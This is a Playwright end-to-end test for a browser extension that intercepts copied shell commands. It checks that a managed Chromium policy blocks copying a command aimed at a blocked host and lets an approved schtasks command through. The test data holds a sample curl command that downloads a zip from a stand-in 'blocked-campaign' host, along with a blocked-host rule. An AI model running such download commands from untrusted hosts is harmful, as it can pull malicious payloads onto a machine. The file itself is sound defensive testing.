// Organisation policy, end to end: Chromium reads a real managed policy file and the
// extension must obey it. Linux CI only, because writing /etc/chromium/policies needs root:
//   sudo node scripts/ext-policy-e2e.mjs --write-policy   (writes the file, then exits)
//   node scripts/ext-policy-e2e.mjs                       (runs the checks)
import { chromium } from 'playwright';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { normalizeForHash, sha256Hex } from '../packages/engine/src/index.ts';

const ID = 'jjkhmdbenclipofjaeeblabpmjdcibpi';
const APPROVED = 'schtasks /create /tn NightlyBackup /tr C:\\Scripts\\backup.bat /sc daily';
const TO_BLOCKED = 'curl -o tool.zip https://cdn.blocked-campaign.example.test/tool.zip';
const POLICY = {
  '3rdparty': {
    extensions: {
      [ID]: {
        blockedHosts: ['blocked-campaign.example.test'],
        approvedCommands: [sha256Hex(normalizeForHash(APPROVED))],
        allowCopyAnyway: false,
        lang: 'hi',
        deviceLabel: 'Policy Lab PC',
      },
    },
  },
};

// Linux policy folders: Chromium, Google Chrome, and Chrome for Testing (what Playwright ships).
const POLICY_DIRS = ['/etc/chromium/policies/managed', '/etc/opt/chrome/policies/managed', '/etc/opt/chrome_for_testing/policies/managed'];
if (process.argv.includes('--write-policy')) {
  for (const dir of POLICY_DIRS) {
    mkdirSync(dir, { recursive: true });
    writeFileSync(`${dir}/owlcept.json`, JSON.stringify(POLICY, null, 2));
    console.log(`policy written to ${dir}/owlcept.json`);
  }
  process.exit(0);
}

const ext = new URL('../extension/dist/', import.meta.url).pathname;
const results = [];
const check = (name, ok, detail = '') => {
  results.push(ok);
  console.log(`${ok ? '✓' : '✗'} ${name}${detail ? ` — ${detail}` : ''}`);
};
const page = (cmd) => `<!doctype html><meta charset="utf-8"><pre id="cmd">${cmd}</pre>
<button id="copy" onclick="navigator.clipboard.writeText(document.getElementById('cmd').textContent)">Copy</button>`;
const PAGES = { 'https://admin.example.test/': page(APPROVED), 'https://tools.example.test/': page(TO_BLOCKED) };

const context = await chromium.launchPersistentContext(mkdtempSync(join(tmpdir(), 'owlcept-policy-')), {
  channel: 'chromium',
  headless: true,
  args: [`--disable-extensions-except=${ext}`, `--load-extension=${ext}`],
});
await context.grantPermissions(['clipboard-read', 'clipboard-write']);
await context.route(/^https?:\/\//, (r) => (PAGES[r.request().url()] ? r.fulfill({ contentType: 'text/html', body: PAGES[r.request().url()] }) : r.abort()));
let [worker] = context.serviceWorkers();
worker ??= await context.waitForEvent('serviceworker');

const managed = await worker.evaluate(() => chrome.storage.managed.get(null));
check('Chromium hands the policy to the extension', managed.deviceLabel === 'Policy Lab PC', JSON.stringify(managed).slice(0, 80));
if (managed.deviceLabel !== 'Policy Lab PC') {
  // Show what the browser itself loaded, so a path or format problem is visible in the log.
  const diag = await context.newPage();
  await diag.goto('chrome://policy');
  await diag.waitForTimeout(1500);
  console.log('chrome://policy says:', (await diag.textContent('body')).replace(/\s+/g, ' ').slice(0, 1500));
  await diag.goto('chrome://version');
  console.log('chrome://version:', (await diag.textContent('body')).replace(/\s+/g, ' ').slice(0, 600));
}

// The user (or anything with storage access) cannot override organisation-only rules.
await worker.evaluate(() => chrome.storage.local.set({ settings: { blockedHosts: [], approvedCommands: [], lang: 'en' } }));

const copy = async (url) => {
  const p = await context.newPage();
  await p.goto(url);
  await p.waitForTimeout(300);
  await p.click('#copy');
  await p.waitForTimeout(900);
  return { p, banner: await p.evaluate(() => !!document.querySelector('owlcept-warning')), clip: await p.evaluate(() => navigator.clipboard.readText()) };
};

let r = await copy('https://tools.example.test/');
check('a command contacting a blocked host is blocked', r.banner && r.clip.startsWith('# OwlCept'), r.clip.slice(0, 50));
r = await copy('https://admin.example.test/');
check('an approved command copies silently', !r.banner && r.clip === APPROVED);

const dash = await context.newPage();
await dash.goto(`chrome-extension://${(new URL(worker.url())).host}/dashboard.html`);
await dash.waitForFunction(() => document.getElementById('status')?.textContent?.includes('protection'));
check('dashboard shows the organisation rules', /1 blocked site/.test(await dash.textContent('#org-summary')) && /1 approved command/.test(await dash.textContent('#org-summary')));
check('policy-set language is locked (and local storage did not override it)', await dash.$eval('#lang', (s) => s.disabled && s.value === 'hi'));

await context.close();
const failed = results.filter((x) => !x).length;
console.log(failed ? `${failed} check(s) failed` : `all ${results.length} checks passed`);
process.exit(failed ? 1 : 0);
